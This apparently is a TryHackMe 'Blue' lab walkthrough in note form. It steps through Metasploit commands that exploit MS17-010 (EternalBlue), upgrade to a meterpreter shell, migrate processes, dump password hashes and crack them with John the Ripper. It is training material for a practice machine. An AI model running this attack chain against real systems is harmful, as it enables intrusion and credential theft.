# Blue Machine Walkthrough
#pentest #pentest/tryhackme

## First we start with the classic nmap
`nmap -sV --script vuln <IP>`

## Here we find that the machine is vulnerable to:
`ms17-010`

## We start metasploit
`msfdb run`

## Let’s find out how to exploit this bug:
`search ms17_010` -> `exploit/windows/smb/ms17_010_eternalblue`

## Let’s use this exploit
`use exploit/windows/smb/ms17_010_eternalblue`

## Cool, now we have to see which options to fill and set them:
`show options` -> `set rhosts <IP>`

## And run the exploit:
`run`

## Now that we have the windows shell let’s put it in the background and try to get the meterpreter shell setup
`background` 
-> `search shell_to_meterpreter` 
-> `use post/multi/manage/shell_to_meterpreter` 
-> `set session <windows_session_number>`
-> `run`

## Now we have a better shell, let’s connect to it
`sessions` -> `sessions -i <meterpreter_session_number>`

## Inside our meterpreter shell we can list our processes and try to migrate to a better one
`ps`
-> `migrate <pid_of_spool_service>`

## Awesome, now that we are privileged we can fetch the credentials 
`hashdump`

## And use john the ripper to crack them
`sudo john <credentials_file> --format=NT --wordlist=/usr/share/wordlists/rockyou.txt`
